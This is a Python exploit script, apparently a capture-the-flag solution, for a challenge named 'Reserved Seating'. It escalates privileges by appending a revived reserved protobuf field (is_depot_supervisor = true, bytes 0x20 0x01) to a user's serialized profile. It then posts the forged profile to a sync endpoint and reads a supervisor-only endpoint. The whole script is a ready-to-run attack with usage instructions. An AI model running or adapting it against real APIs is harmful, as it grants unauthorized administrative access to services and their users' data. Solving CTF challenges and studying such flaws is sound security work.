#!/usr/bin/env python3
# Reserved Seating (Fluid Attacks CTF 2026, API) -- protobuf reserved-field revival.
# Uso:    ./protobuf_reserved_field.py <base_url> <session_cookie_o_token>
# Ejemplo: ./protobuf_reserved_field.py https://<host>.chal.ctf.ae "session=..."
#
# El wire de protobuf solo lleva el numero de tag, no el nombre. 'reserved 4' (rev12) era
# bool is_depot_supervisor (field 4) en rev11, y el server corre rev11 (GET /api/v1/schema).
# Basta anexar el campo por su tag al profile serializado: 0x20 0x01
#   0x20 = (field 4 << 3) | wiretype 0 (varint) ; 0x01 = varint true.
# No requiere el .proto: se opera sobre los bytes crudos del mensaje.

import sys, urllib.request

BASE   = sys.argv[1].rstrip("/")
COOKIE = sys.argv[2] if len(sys.argv) > 2 else ""
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

def call(path, data=None, method="GET"):
    req = urllib.request.Request(BASE + path, data=data, method=method,
        headers={"User-Agent": UA, "Cookie": COOKIE,
                 "Content-Type": "application/x-protobuf",
                 "Accept": "application/x-protobuf"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read()

# 1) obtener el profile serializado (protobuf crudo)
profile = call("/api/v1/profile")
print(f"[*] profile: {len(profile)} bytes")

# 2) anexar field 4 (is_depot_supervisor = true): tag 0x20, varint 0x01
forged = profile + bytes([0x20, 0x01])

# 3) sincronizar el profile modificado -> rol depot_supervisor
call("/api/v1/profile/sync", data=forged, method="POST")
print("[*] profile/sync enviado con field 4 = true")

# 4) endpoint antes 403
print("[*] /api/v1/rota/supervisor:")
sys.stdout.buffer.write(call("/api/v1/rota/supervisor"))
print()
